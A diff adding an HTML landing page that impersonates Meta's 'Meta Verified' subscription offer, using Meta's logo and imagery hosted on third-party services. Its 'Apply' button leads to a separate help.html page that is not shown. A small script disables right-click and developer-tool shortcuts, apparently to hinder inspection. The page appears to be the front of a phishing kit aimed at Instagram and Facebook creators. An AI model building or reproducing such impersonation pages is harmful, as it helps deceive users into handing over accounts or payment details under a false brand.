@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Home</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="icon" href="https://pbs.twimg.com/media/GQB99gQaQAEUOZ7?format=png&name=small">
+    <style>
+        body {
+            font-family: system-ui;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container-fluid {
+            background: #F5F6F6;
+        }
+
+        .btn {
+            background: #0064e0;
+            border: none;
+            border-radius: 100px;
+            padding: 10px 35px;
+            text-decoration: none;
+            color: white;
+            display: inline-block;
+            margin-top: 1rem;
+            font-family: Arial, sans-serif;
+            font-size: 16px;
+        }
+
+        .content {
+            margin-top: 3rem;
+            display: flex;
+            justify-content: center;
+        }
+
+        .content .col-sm-6 {
+            margin-top: 3rem;
+            margin-left: 5rem;
+        }
+
+        .content p {
+            font-size: 18px;
+            margin-top: 1rem;
+            font-family: Arial, sans-serif;
+        }
+
+        .sign-up {
+            font-size: 17px;
+            padding-top: 1rem;
+            font-family: Arial, sans-serif;
+        }
+
+        .business-info {
+            font-size: 14px;
+            font-family: Arial, sans-serif;
+        }
+
+        .region-info {
+            font-size: small;
+            opacity: 95%;
+            font-family: Arial, sans-serif;
+        }
+
+        .image {
+            display: none;
+            width: 42%;
+            height: 100vh;
+            background-size: cover;
+        }
+
+        @media (min-width: 576px) {
+            .image {
+                display: block;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container-fluid">
+        <img width="120px" src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Meta-Logo.png/2560px-Meta-Logo.png" alt="Meta Logo">
+    </div>
+    <div class="content">
+        <div class="col-sm-6">
+            <img width="80px" src="https://cdn.glitch.global/72dd466a-3029-4a45-bd08-d88ed76ff9af/7d58dba8-8717-4503-aff2-55586c3fe20d.a89f7c20-27a2-4c6c-9a08-caa301574ad6.image.png?v=1721850235302" alt="Meta Verified Icon">
+            <h1 class="my-3 fs-1">Become <br> Meta Verified</h1>
+            <div style="margin-bottom: 30px;"></div>
+
+            <a href="help.html" class="btn">Apply</a>
+
+            <p class="mt-4">Grow your social presence with Meta Verified – a new subscription <br> bundle available for creators and businesses on Instagram and <br> Facebook.</p>
+            <p class="sign-up">Sign up now for creators</p>
+            <p class="mt-4 mb-0">
+                <span class="fw-semibold">Are you a business?</span> Get more information on
+            </p>
+            <a href="#" class="business-info">Meta verified for businesses</a> <br><br>
+            <i class="region-info">Features, availability, and pricing may vary by region.</i>
+        </div>
+        <div class="col-sm-5 image" style="background-image: url('https://verified-badge.fly.dev/static/media/mainlogo.1e021de7020fcdab170b.png');"></div>
+    </div>
+
+    <script>
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+        document.onkeydown = function(e) {
+            if (e.ctrlKey && (e.shiftKey || e.key === "I" || e.key === "i")) {
+                e.preventDefault();
+            }
+        };
+    </script>
+</body>
+
+</html>
